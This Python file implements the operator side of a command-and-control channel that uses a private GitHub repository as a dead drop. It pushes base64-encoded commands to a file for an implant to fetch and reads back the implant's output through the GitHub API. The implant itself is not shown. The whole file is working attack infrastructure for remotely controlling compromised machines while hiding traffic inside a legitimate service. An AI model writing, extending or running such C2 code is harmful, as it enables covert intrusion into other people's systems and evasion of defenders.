import logging
import requests
import json
import base64
import time

class GitHubC2:
    """
    A class to manage a C2 channel using a private GitHub repository as a dead drop.
    """
    def __init__(self, token, repo_owner, repo_name, cmd_file="cmd.txt", output_file="output.txt"):
        self.token = token
        self.repo_owner = repo_owner
        self.repo_name = repo_name
        self.cmd_file = cmd_file
        self.output_file = output_file
        self.api_base_url = f"https://api.github.com/repos/{repo_owner}/{repo_name}/contents/"
        self.headers = {
            "Authorization": f"token {self.token}",
            "Accept": "application/vnd.github.v3+json",
        }

    def _get_file_sha(self, filepath):
        """Gets the SHA hash of a file in the repository."""
        url = self.api_base_url + filepath
        response = requests.get(url, headers=self.headers)
        if response.status_code == 200:
            return response.json()['sha']
        return None

    def issue_command(self, command):
        """Writes a command to the command file in the repository."""
        content = base64.b64encode(command.encode()).decode()
        sha = self._get_file_sha(self.cmd_file)

        data = {
            "message": f"C2: New command issued ({time.time()})",
            "content": content,
        }
        if sha:
            data["sha"] = sha

        url = self.api_base_url + self.cmd_file
        response = requests.put(url, headers=self.headers, data=json.dumps(data))

        if response.status_code in [200, 201]:
            logging.info(f"Successfully issued command: {command}")
            return True
        else:
            logging.error(f"Failed to issue command. Status: {response.status_code}, Response: {response.text}")
            print(f"Error: Could not write to repository. Check your token and permissions. Details: {response.text}")
            return False

    def get_output(self):
        """Reads the output from the output file in the repository."""
        url = self.api_base_url + self.output_file
        response = requests.get(url, headers=self.headers)

        if response.status_code == 200:
            content = base64.b64decode(response.json()['content']).decode(errors='ignore')
            return content
        else:
            logging.warning(f"Could not retrieve output file. It may not exist yet.")
            return "No output available yet. The implant may not have checked in."

# --- Helper functions for standalone use if needed ---
def configure_c2(token, repo_owner, repo_name):
    """Factory function to create and configure a GitHubC2 instance."""
    return GitHubC2(token, repo_owner, repo_name)
